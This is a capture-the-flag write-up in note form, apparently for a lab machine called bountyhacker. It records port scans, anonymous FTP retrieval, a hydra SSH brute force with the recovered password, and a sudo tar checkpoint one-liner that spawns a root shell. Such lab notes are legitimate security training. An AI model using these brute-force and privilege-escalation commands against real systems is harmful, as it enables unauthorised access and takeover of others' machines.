# Info
- IP = $IP

## Creds
 - lin:RedDr4gonSynd1cat3

# Ports

## PortScan
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## 21

### `nmap`
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:$IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
```

### Anonymous Login
- "ls" command is not working... the terminal shows "Entering Extended Passive Mode"

### checking how to pentest ftp
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
- `wget -m --no-passive ftp://anonymous:anonymous@<IP>`

### checking the files
1. locks.txt
    - wordlist
2. task.txt
    ```
    1.) Protect Vicious.
    2.) Plan for Red Eye pickup on the moon.

    -lin
    ```
    - maybe 

## 22

### `nmap`
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
```

### using username and wordlist found to try bruteforce using `hydra`
- `[22][ssh] host: $IP   login: lin   password: RedDr4gonSynd1cat3`

## 80

### `nmap` 
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### `gobuster`
#### `./gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt`
```
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://$IP/images/]                                                                         
/index.html           (Status: 200) [Size: 969]
/server-status        (Status: 403) [Size: 277]
```

# Actions

## Using creds found to login via ssh in lin's profile

### /home/lin/Desktop/user.txt
- `flag{XXXX}`

## PrivEsc

### `sudo -l`

```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

### https://gtfobins.github.io/gtfobins/tar/#sudo

```
lin@bountyhacker:/tmp$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt
# cat roo
cat: roo: No such file or directory
# cat root.txt
flag{XXXX}
```


